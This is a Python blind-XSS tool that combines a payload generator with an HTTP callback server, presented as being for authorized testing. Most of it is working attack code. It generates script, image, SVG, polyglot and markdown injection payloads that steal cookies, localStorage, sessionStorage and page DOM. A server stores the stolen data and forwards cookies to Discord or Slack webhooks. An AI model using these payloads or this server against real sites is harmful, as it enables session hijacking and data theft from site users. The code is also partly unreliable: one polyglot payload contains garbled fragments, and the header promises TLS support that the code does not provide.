#!/usr/bin/env python3
"""
Blind XSS Server - Blind Cross-Site Scripting Callback Server & Payload Generator
==================================================================================

A lightweight HTTP callback server and payload generator for blind XSS testing.
Generates tracking payloads with embedded callback URLs, captures incoming
callbacks with full context data, and supports webhook notifications.

Features:
- Lightweight HTTP server for receiving blind XSS callbacks
- Unique tracking payloads with embedded callback URLs
- Captures: cookies, DOM content, URL, User-Agent, referrer, localStorage, sessionStorage
- JSON file storage with timestamps for all captures
- Multiple payload types: script src, img src, fetch, XMLHttpRequest
- Optional webhook notification (Discord, Slack) on callback
- Standalone payload generation mode
- Configurable host/port binding
- TLS support (optional)

Usage:
    # Start callback server
    python3 blind-xss-server.py --port 8080 --host 0.0.0.0

    # Generate payloads only (no server)
    python3 blind-xss-server.py --generate-payloads --callback-url https://your-server.com:8080

    # Server with webhook notifications
    python3 blind-xss-server.py --port 8080 --webhook-url https://hooks.slack.com/services/xxx

    # Server with custom output directory
    python3 blind-xss-server.py --port 8080 --output-dir ./blind-xss-captures

Author: Security Research Team
License: For authorized security testing only
"""

import argparse
import base64
import hashlib
import http.server
import json
import os
import random
import re
import socketserver
import string
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass, asdict, field
from datetime import datetime
from typing import Dict, List, Optional, Any

try:
    import requests
except ImportError:
    requests = None

# ============================================================================
# CONFIGURATION
# ============================================================================

DEFAULT_PORT = 8080
DEFAULT_HOST = "0.0.0.0"
DEFAULT_OUTPUT_DIR = "./blind-xss-captures"

# ============================================================================
# TERMINAL COLORS
# ============================================================================

class Colors:
    """ANSI color codes for terminal output."""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def disable():
        for attr in ['RED', 'GREEN', 'YELLOW', 'BLUE', 'MAGENTA', 'CYAN', 'WHITE', 'BOLD', 'END']:
            setattr(Colors, attr, '')


class Logger:
    """Logging utility with colored output."""
    verbose = False

    @staticmethod
    def info(msg: str):
        print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

    @staticmethod
    def success(msg: str):
        print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

    @staticmethod
    def warning(msg: str):
        print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

    @staticmethod
    def error(msg: str):
        print(f"{Colors.RED}[-]{Colors.END} {msg}")

    @staticmethod
    def callback(msg: str):
        print(f"{Colors.RED}{Colors.BOLD}[CALLBACK]{Colors.END} {msg}")

    @staticmethod
    def debug(msg: str):
        if Logger.verbose:
            print(f"{Colors.CYAN}[D]{Colors.END} {msg}")


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class CapturedCallback:
    """Data captured from a blind XSS callback."""
    tracking_id: str
    timestamp: str
    source_ip: str
    user_agent: str
    referer: str
    callback_url: str
    method: str
    cookies: str
    dom_content: str
    page_url: str
    local_storage: str
    session_storage: str
    screenshot_data: str
    custom_data: Dict[str, Any] = field(default_factory=dict)
    raw_headers: Dict[str, str] = field(default_factory=dict)
    raw_query: str = ""
    raw_body: str = ""

@dataclass
class BlindXSSPayload:
    """A generated blind XSS payload."""
    tracking_id: str
    payload_type: str
    payload: str
    description: str
    callback_url: str


# ============================================================================
# TRACKING ID GENERATOR
# ============================================================================

class TrackingIDGenerator:
    """Generates unique tracking IDs for blind XSS payloads."""

    @staticmethod
    def generate(prefix: str = "bxss") -> str:
        """Generate a unique tracking ID."""
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        timestamp_part = hex(int(time.time()))[2:]
        return f"{prefix}_{timestamp_part}_{random_part}"

    @staticmethod
    def generate_short() -> str:
        """Generate a shorter tracking ID."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================

class PayloadGenerator:
    """Generates blind XSS payloads with embedded callback URLs."""

    def __init__(self, callback_url: str):
        self.callback_url = callback_url.rstrip('/')

    def generate_all(self, tracking_id: Optional[str] = None) -> List[BlindXSSPayload]:
        """Generate all payload types for a single tracking ID."""
        if not tracking_id:
            tracking_id = TrackingIDGenerator.generate()

        payloads = []
        payloads.extend(self._script_src_payloads(tracking_id))
        payloads.extend(self._img_src_payloads(tracking_id))
        payloads.extend(self._fetch_payloads(tracking_id))
        payloads.extend(self._xhr_payloads(tracking_id))
        payloads.extend(self._svg_payloads(tracking_id))
        payloads.extend(self._polyglot_payloads(tracking_id))
        payloads.extend(self._markdown_payloads(tracking_id))
        return payloads

    def _collector_js(self, tracking_id: str) -> str:
        """Generate the JavaScript collector code that gathers page data."""
        collect_url = f"{self.callback_url}/collect"
        return (
            f"(function(){{"
            f"var d={{}};"
            f"d.id='{tracking_id}';"
            f"d.url=location.href;"
            f"d.cookies=document.cookie;"
            f"d.referrer=document.referrer;"
            f"d.dom=document.documentElement.outerHTML.substring(0,5000);"
            f"try{{d.localStorage=JSON.stringify(localStorage)}}catch(e){{d.localStorage='error'}};"
            f"try{{d.sessionStorage=JSON.stringify(sessionStorage)}}catch(e){{d.sessionStorage='error'}};"
            f"d.ua=navigator.userAgent;"
            f"d.platform=navigator.platform;"
            f"d.language=navigator.language;"
            f"d.screen=screen.width+'x'+screen.height;"
            f"d.origin=location.origin;"
            f"var x=new XMLHttpRequest();"
            f"x.open('POST','{collect_url}',true);"
            f"x.setRequestHeader('Content-Type','application/json');"
            f"x.send(JSON.stringify(d));"
            f"}})();"
        )

    def _script_src_payloads(self, tracking_id: str) -> List[BlindXSSPayload]:
        """Generate script src based payloads."""
        probe_url = f"{self.callback_url}/probe/{tracking_id}"
        return [
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="script-src",
                payload=f'"><script src="{probe_url}"></script>',
                description="Script tag with external source - breaks out of attribute context",
                callback_url=probe_url,
            ),
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="script-src-clean",
                payload=f'<script src="{probe_url}"></script>',
                description="Clean script tag with external source",
                callback_url=probe_url,
            ),
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="script-src-close",
                payload=f"'><script src='{probe_url}'></script>",
                description="Script tag - breaks out of single-quote attribute context",
                callback_url=probe_url,
            ),
        ]

    def _img_src_payloads(self, tracking_id: str) -> List[BlindXSSPayload]:
        """Generate img-based callback payloads."""
        ping_url = f"{self.callback_url}/ping/{tracking_id}"
        return [
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="img-src",
                payload=f'"><img src="{ping_url}">',
                description="Image tag for basic callback detection (no data exfil)",
                callback_url=ping_url,
            ),
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="img-onerror",
                payload=f'<img src=x onerror="var i=new Image();i.src=\'{ping_url}?c=\'+document.cookie">',
                description="Image onerror with cookie exfiltration",
                callback_url=ping_url,
            ),
        ]

    def _fetch_payloads(self, tracking_id: str) -> List[BlindXSSPayload]:
        """Generate fetch-based payloads."""
        collect_url = f"{self.callback_url}/collect"
        collector = self._collector_js(tracking_id)

        return [
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="fetch-full",
                payload=f'"><script>{collector}</script>',
                description="Full data collector via fetch/XHR - captures cookies, DOM, storage",
                callback_url=collect_url,
            ),
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="fetch-inline",
                payload=f"<script>{collector}</script>",
                description="Clean inline script with full data collection",
                callback_url=collect_url,
            ),
        ]

    def _xhr_payloads(self, tracking_id: str) -> List[BlindXSSPayload]:
        """Generate XMLHttpRequest-based payloads."""
        collect_url = f"{self.callback_url}/collect"
        xhr_js = (
            f"var x=new XMLHttpRequest();"
            f"x.open('POST','{collect_url}',true);"
            f"x.setRequestHeader('Content-Type','application/json');"
            f"x.send(JSON.stringify({{id:'{tracking_id}',url:location.href,cookies:document.cookie,"
            f"ua:navigator.userAgent,dom:document.documentElement.outerHTML.substring(0,5000)}}));"
        )
        return [
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="xhr-post",
                payload=f'<script>{xhr_js}</script>',
                description="XMLHttpRequest POST with page data",
                callback_url=collect_url,
            ),
        ]

    def _svg_payloads(self, tracking_id: str) -> List[BlindXSSPayload]:
        """Generate SVG-based payloads."""
        ping_url = f"{self.callback_url}/ping/{tracking_id}"
        collector = self._collector_js(tracking_id)

        return [
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="svg-onload",
                payload=f'<svg onload="{collector}">',
                description="SVG onload with full data collection",
                callback_url=ping_url,
            ),
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="svg-simple",
                payload=f'<svg/onload="new Image().src=\'{ping_url}?c=\'+document.cookie">',
                description="SVG onload with simple cookie exfil",
                callback_url=ping_url,
            ),
        ]

    def _polyglot_payloads(self, tracking_id: str) -> List[BlindXSSPayload]:
        """Generate polyglot payloads that work across multiple contexts."""
        probe_url = f"{self.callback_url}/probe/{tracking_id}"
        collector = self._collector_js(tracking_id)

        return [
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="polyglot-basic",
                payload=f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0telerik%0telerik/telerik/comment%0telerik><svg/0telerik/telerik=oNloAd=alert()//",
                description="Multi-context polyglot (no exfil - detection only)",
                callback_url=probe_url,
            ),
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="polyglot-exfil",
                payload=f'--></script><script>{collector}</script><!--',
                description="Close existing tags and inject collector script",
                callback_url=probe_url,
            ),
        ]

    def _markdown_payloads(self, tracking_id: str) -> List[BlindXSSPayload]:
        """Generate payloads for markdown/rich-text contexts."""
        probe_url = f"{self.callback_url}/probe/{tracking_id}"
        ping_url = f"{self.callback_url}/ping/{tracking_id}"

        return [
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="markdown-img",
                payload=f'![img]({ping_url})',
                description="Markdown image for callback detection",
                callback_url=ping_url,
            ),
            BlindXSSPayload(
                tracking_id=tracking_id,
                payload_type="markdown-link",
                payload=f'[click](javascript:document.location="{ping_url}?c="+document.cookie)',
                description="Markdown link with javascript: protocol",
                callback_url=ping_url,
            ),
        ]


# ============================================================================
# CAPTURE STORAGE
# ============================================================================

class CaptureStorage:
    """Stores captured callback data to disk."""

    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.index_file = os.path.join(output_dir, "captures_index.json")
        self._ensure_index()

    def _ensure_index(self):
        """Ensure the index file exists."""
        if not os.path.exists(self.index_file):
            with open(self.index_file, 'w') as f:
                json.dump([], f)

    def save(self, capture: CapturedCallback) -> str:
        """Save a capture to a JSON file and update the index. Returns file path."""
        timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{capture.tracking_id}_{timestamp_str}.json"
        filepath = os.path.join(self.output_dir, filename)

        with open(filepath, 'w') as f:
            json.dump(asdict(capture), f, indent=2)

        # Update index
        try:
            with open(self.index_file, 'r') as f:
                index = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            index = []

        index.append({
            'tracking_id': capture.tracking_id,
            'timestamp': capture.timestamp,
            'source_ip': capture.source_ip,
            'page_url': capture.page_url,
            'file': filename,
        })

        with open(self.index_file, 'w') as f:
            json.dump(index, f, indent=2)

        return filepath


# ============================================================================
# WEBHOOK NOTIFIER
# ============================================================================

class WebhookNotifier:
    """Sends notifications via webhook (Discord/Slack) on callback receipt."""

    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self._detect_type()

    def _detect_type(self):
        """Detect webhook type from URL."""
        if 'discord' in self.webhook_url:
            self.webhook_type = 'discord'
        elif 'slack' in self.webhook_url:
            self.webhook_type = 'slack'
        else:
            self.webhook_type = 'generic'

    def notify(self, capture: CapturedCallback):
        """Send a webhook notification about a captured callback."""
        if requests is None:
            Logger.warning("requests library not available - cannot send webhook")
            return

        try:
            if self.webhook_type == 'discord':
                self._notify_discord(capture)
            elif self.webhook_type == 'slack':
                self._notify_slack(capture)
            else:
                self._notify_generic(capture)
        except Exception as e:
            Logger.error(f"Webhook notification failed: {e}")

    def _notify_discord(self, capture: CapturedCallback):
        """Send Discord webhook notification."""
        embed = {
            "title": "Blind XSS Callback Received!",
            "color": 16711680,  # Red
            "fields": [
                {"name": "Tracking ID", "value": capture.tracking_id, "inline": True},
                {"name": "Source IP", "value": capture.source_ip, "inline": True},
                {"name": "Page URL", "value": capture.page_url[:200] or "N/A", "inline": False},
                {"name": "Cookies", "value": capture.cookies[:200] or "N/A", "inline": False},
                {"name": "User Agent", "value": capture.user_agent[:200] or "N/A", "inline": False},
            ],
            "timestamp": capture.timestamp,
        }
        payload = {"embeds": [embed]}
        requests.post(self.webhook_url, json=payload, timeout=10)
        Logger.debug("Discord webhook notification sent")

    def _notify_slack(self, capture: CapturedCallback):
        """Send Slack webhook notification."""
        text = (
            f"*Blind XSS Callback Received!*\n"
            f">*Tracking ID:* {capture.tracking_id}\n"
            f">*Source IP:* {capture.source_ip}\n"
            f">*Page URL:* {capture.page_url[:200] or 'N/A'}\n"
            f">*Cookies:* {capture.cookies[:200] or 'N/A'}\n"
            f">*User Agent:* {capture.user_agent[:200] or 'N/A'}\n"
            f">*Timestamp:* {capture.timestamp}"
        )
        payload = {"text": text}
        requests.post(self.webhook_url, json=payload, timeout=10)
        Logger.debug("Slack webhook notification sent")

    def _notify_generic(self, capture: CapturedCallback):
        """Send generic webhook notification."""
        payload = {
            "event": "blind_xss_callback",
            "data": asdict(capture),
        }
        requests.post(self.webhook_url, json=payload, timeout=10)
        Logger.debug("Generic webhook notification sent")


# ============================================================================
# HTTP CALLBACK SERVER
# ============================================================================

class BlindXSSHandler(http.server.BaseHTTPRequestHandler):
    """HTTP request handler for blind XSS callbacks."""

    # These are set by the server before handling requests
    storage = None
    notifier = None

    def log_message(self, format, *args):
        """Override to use our Logger instead of default stderr logging."""
        Logger.debug(f"HTTP: {format % args}")

    def _set_cors_headers(self):
        """Set CORS headers to accept callbacks from any origin."""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With')

    def _extract_tracking_id(self, path: str) -> str:
        """Extract tracking ID from URL path."""
        parts = path.strip('/').split('/')
        if len(parts) >= 2:
            return parts[-1].split('?')[0]
        return "unknown"

    def _parse_query_params(self, path: str) -> Dict[str, str]:
        """Parse query parameters from URL."""
        parsed = urllib.parse.urlparse(path)
        return dict(urllib.parse.parse_qsl(parsed.query))

    def _capture_from_request(self, path: str, body: str = "") -> CapturedCallback:
        """Build a CapturedCallback from the current request."""
        tracking_id = self._extract_tracking_id(path)
        query_params = self._parse_query_params(path)
        headers = {k: v for k, v in self.headers.items()}

        # Try to parse JSON body
        json_data = {}
        if body:
            try:
                json_data = json.loads(body)
                if isinstance(json_data, dict) and 'id' in json_data:
                    tracking_id = json_data['id']
            except (json.JSONDecodeError, TypeError):
                pass

        return CapturedCallback(
            tracking_id=tracking_id,
            timestamp=datetime.now().isoformat(),
            source_ip=self.client_address[0],
            user_agent=self.headers.get('User-Agent', ''),
            referer=self.headers.get('Referer', ''),
            callback_url=path,
            method=self.command,
            cookies=json_data.get('cookies', query_params.get('c', query_params.get('cookies', ''))),
            dom_content=json_data.get('dom', query_params.get('dom', ''))[:10000],
            page_url=json_data.get('url', query_params.get('url', self.headers.get('Referer', ''))),
            local_storage=json_data.get('localStorage', ''),
            session_storage=json_data.get('sessionStorage', ''),
            screenshot_data=json_data.get('screenshot', json_data.get('img', '')),
            custom_data={k: v for k, v in json_data.items() if k not in ('id', 'cookies', 'dom', 'url', 'localStorage', 'sessionStorage', 'screenshot', 'img')},
            raw_headers=headers,
            raw_query=urllib.parse.urlparse(path).query,
            raw_body=body[:10000],
        )

    def _handle_callback(self, path: str, body: str = ""):
        """Process an incoming callback."""
        capture = self._capture_from_request(path, body)

        Logger.callback(
            f"Tracking ID: {capture.tracking_id} | "
            f"IP: {capture.source_ip} | "
            f"URL: {capture.page_url[:80] or 'N/A'}"
        )

        if capture.cookies:
            Logger.success(f"  Cookies: {capture.cookies[:100]}")
        if capture.dom_content:
            Logger.success(f"  DOM: {len(capture.dom_content)} chars captured")
        if capture.local_storage:
            Logger.success(f"  localStorage: {capture.local_storage[:100]}")
        if capture.session_storage:
            Logger.success(f"  sessionStorage: {capture.session_storage[:100]}")
        if capture.screenshot_data:
            Logger.success(f"  Screenshot: {len(capture.screenshot_data)} chars (base64)")

        # Save capture
        if self.storage:
            filepath = self.storage.save(capture)
            Logger.info(f"  Saved to: {filepath}")

        # Webhook notification
        if self.notifier:
            threading.Thread(target=self.notifier.notify, args=(capture,), daemon=True).start()

    def do_OPTIONS(self):
        """Handle CORS preflight requests."""
        self.send_response(200)
        self._set_cors_headers()
        self.end_headers()

    def do_GET(self):
        """Handle GET requests."""
        path = self.path

        if path == '/' or path == '/health':
            # Health check / landing page
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Blind XSS Server Active\n")
            return

        if path.startswith('/probe/'):
            # Serve collector JavaScript
            tracking_id = self._extract_tracking_id(path)
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self._set_cors_headers()
            self.end_headers()

            # Determine the callback URL from the request
            host = self.headers.get('Host', 'localhost')
            scheme = 'https' if self.server.server_port == 443 else 'http'
            callback_base = f"{scheme}://{host}"

            generator = PayloadGenerator(callback_base)
            collector_js = generator._collector_js(tracking_id)
            self.wfile.write(collector_js.encode())

            Logger.info(f"Served probe JS for tracking ID: {tracking_id}")
            self._handle_callback(path)
            return

        if path.startswith('/ping/') or path.startswith('/callback/'):
            # Simple ping callback
            self._handle_callback(path)
            # Return a 1x1 transparent GIF
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self._set_cors_headers()
            self.end_headers()
            # Minimal valid GIF
            gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
            self.wfile.write(gif)
            return

        if path.startswith('/collect'):
            # Collect endpoint (GET with query params)
            self._handle_callback(path)
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self._set_cors_headers()
            self.end_headers()
            self.wfile.write(b"ok")
            return

        if path == '/captures':
            # List captured callbacks
            if self.storage and os.path.exists(self.storage.index_file):
                with open(self.storage.index_file, 'r') as f:
                    index = json.load(f)
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(index, indent=2).encode())
            else:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b"[]")
            return

        # Default: treat as callback
        self._handle_callback(path)
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self._set_cors_headers()
        self.end_headers()
        gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        self.wfile.write(gif)

    def do_POST(self):
        """Handle POST requests (for JSON data collection)."""
        content_length = int(self.headers.get('Content-Length', 0))
        body = ''
        if content_length > 0:
            raw_body = self.rfile.read(min(content_length, 1024 * 1024))  # 1MB limit
            try:
                body = raw_body.decode('utf-8', errors='replace')
            except Exception:
                body = raw_body.decode('latin-1', errors='replace')

        self._handle_callback(self.path, body)

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self._set_cors_headers()
        self.end_headers()
        self.wfile.write(b"ok")


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Threaded HTTP server for handling concurrent callbacks."""
    allow_reuse_address = True
    daemon_threads = True


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Blind XSS Server - Callback Server & Payload Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start callback server on port 8080
  %(prog)s --port 8080 --host 0.0.0.0

  # Generate payloads only (no server)
  %(prog)s --generate-payloads --callback-url https://your-server.com:8080

  # Server with webhook notifications
  %(prog)s --port 8080 --webhook-url https://hooks.slack.com/services/xxx

  # Server with custom output directory
  %(prog)s --port 8080 --output-dir ./captures

Server Endpoints:
  /probe/<id>       Returns collector JavaScript (served as .js)
  /ping/<id>        Simple callback endpoint (returns 1x1 GIF)
  /collect          POST endpoint for JSON data collection
  /callback/<id>    Alias for /ping
  /captures         List all captured callbacks (JSON)
  /health           Health check endpoint

Payload Types:
  script-src        External script tag for full data collection
  img-src           Image tag for basic callback detection
  fetch-full        Inline script with fetch/XHR data collector
  xhr-post          XMLHttpRequest POST with page context
  svg-onload        SVG tag with onload handler
  polyglot-exfil    Multi-context payload for closing existing tags
  markdown-img      Markdown image syntax for callback detection
        """
    )

    parser.add_argument('--port', type=int, default=DEFAULT_PORT,
                        help=f'Server port (default: {DEFAULT_PORT})')
    parser.add_argument('--host', default=DEFAULT_HOST,
                        help=f'Server bind address (default: {DEFAULT_HOST})')
    parser.add_argument('--generate-payloads', action='store_true',
                        help='Generate payloads and exit (no server)')
    parser.add_argument('--callback-url', default='',
                        help='Callback URL for payload generation (e.g., https://your-server.com:8080)')
    parser.add_argument('--webhook-url', default='',
                        help='Webhook URL for notifications (Discord/Slack)')
    parser.add_argument('--output-dir', default=DEFAULT_OUTPUT_DIR,
                        help=f'Directory to store captured callbacks (default: {DEFAULT_OUTPUT_DIR})')
    parser.add_argument('--tracking-id', default='',
                        help='Custom tracking ID for generated payloads')
    parser.add_argument('--output', default='text', choices=['json', 'text'],
                        help='Output format for payload generation (default: text)')
    parser.add_argument('-o', '--output-file', default='',
                        help='Output file for generated payloads')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose debug output')
    parser.add_argument('--no-color', action='store_true',
                        help='Disable colored output')

    args = parser.parse_args()

    if args.no_color:
        Colors.disable()

    Logger.verbose = args.verbose

    # Banner
    print(f"""
{Colors.CYAN}{Colors.BOLD}
 ____  _ _           _  __  ______  ____
| __ )| (_)_ __   __| | \\ \\/ / ___/ ___| ___ _ ____   _____ _ __
|  _ \\| | | '_ \\ / _` |  \\  /\\___ \\___ \\/ _ \\ '__\\ \\ / / _ \\ '__|
| |_) | | | | | | (_| |  /  \\ ___) |__) |  __/ |   \\ V /  __/ |
|____/|_|_|_| |_|\\__,_| /_/\\_\\____/____/ \\___|_|    \\_/ \\___|_|

    Blind XSS Callback Server & Payload Generator
{Colors.END}""")

    # ==========================================
    # PAYLOAD GENERATION MODE
    # ==========================================
    if args.generate_payloads:
        if not args.callback_url:
            Logger.error("--callback-url is required with --generate-payloads")
            sys.exit(1)

        tracking_id = args.tracking_id if args.tracking_id else TrackingIDGenerator.generate()
        generator = PayloadGenerator(args.callback_url)
        payloads = generator.generate_all(tracking_id)

        Logger.success(f"Generated {len(payloads)} payloads with tracking ID: {tracking_id}")
        print()

        if args.output == 'text':
            for i, p in enumerate(payloads, 1):
                print(f"{Colors.BOLD}--- Payload #{i}: {p.payload_type} ---{Colors.END}")
                print(f"  {Colors.CYAN}Description:{Colors.END} {p.description}")
                print(f"  {Colors.CYAN}Tracking ID:{Colors.END} {p.tracking_id}")
                print(f"  {Colors.CYAN}Callback:{Colors.END}    {p.callback_url}")
                print(f"  {Colors.YELLOW}Payload:{Colors.END}")
                display = p.payload if len(p.payload) <= 300 else p.payload[:300] + "..."
                print(f"    {display}")
                print()
        elif args.output == 'json':
            report = {
                'tracking_id': tracking_id,
                'callback_url': args.callback_url,
                'generated_at': datetime.now().isoformat(),
                'total_payloads': len(payloads),
                'payloads': [asdict(p) for p in payloads],
            }
            print(json.dumps(report, indent=2))

        # Save to file if specified
        if args.output_file:
            report = {
                'tracking_id': tracking_id,
                'callback_url': args.callback_url,
                'generated_at': datetime.now().isoformat(),
                'total_payloads': len(payloads),
                'payloads': [asdict(p) for p in payloads],
            }
            with open(args.output_file, 'w') as f:
                json.dump(report, f, indent=2)
            Logger.success(f"Payloads saved to: {args.output_file}")

        sys.exit(0)

    # ==========================================
    # SERVER MODE
    # ==========================================
    storage = CaptureStorage(args.output_dir)
    BlindXSSHandler.storage = storage

    notifier = None
    if args.webhook_url:
        notifier = WebhookNotifier(args.webhook_url)
        BlindXSSHandler.notifier = notifier
        Logger.info(f"Webhook notifications enabled: {args.webhook_url[:50]}...")

    # If no callback URL specified, construct from host/port
    if not args.callback_url:
        display_host = args.host if args.host != '0.0.0.0' else 'localhost'
        callback_url = f"http://{display_host}:{args.port}"
    else:
        callback_url = args.callback_url

    Logger.info(f"Callback URL: {callback_url}")
    Logger.info(f"Captures directory: {os.path.abspath(args.output_dir)}")

    # Generate a sample set of payloads for reference
    sample_id = TrackingIDGenerator.generate()
    generator = PayloadGenerator(callback_url)
    sample_payloads = generator.generate_all(sample_id)

    print(f"\n{Colors.BOLD}Sample payloads (tracking ID: {sample_id}):{Colors.END}")
    for p in sample_payloads[:5]:
        display = p.payload if len(p.payload) <= 120 else p.payload[:120] + "..."
        print(f"  {Colors.CYAN}[{p.payload_type}]{Colors.END} {display}")

    print(f"\n{Colors.BOLD}Server Endpoints:{Colors.END}")
    print(f"  {Colors.GREEN}/probe/<id>{Colors.END}    - Serves collector JS")
    print(f"  {Colors.GREEN}/ping/<id>{Colors.END}     - Simple ping callback (returns 1x1 GIF)")
    print(f"  {Colors.GREEN}/collect{Colors.END}       - POST endpoint for JSON data")
    print(f"  {Colors.GREEN}/captures{Colors.END}      - List all captures")
    print(f"  {Colors.GREEN}/health{Colors.END}        - Health check")

    # Start server
    try:
        server = ThreadedHTTPServer((args.host, args.port), BlindXSSHandler)
        Logger.success(f"Server started on {args.host}:{args.port}")
        Logger.info("Waiting for callbacks... (Ctrl+C to stop)")
        print(f"\n{'=' * 60}\n")
        server.serve_forever()
    except KeyboardInterrupt:
        Logger.warning("Server stopped by user")
        server.shutdown()
    except OSError as e:
        Logger.error(f"Could not start server: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
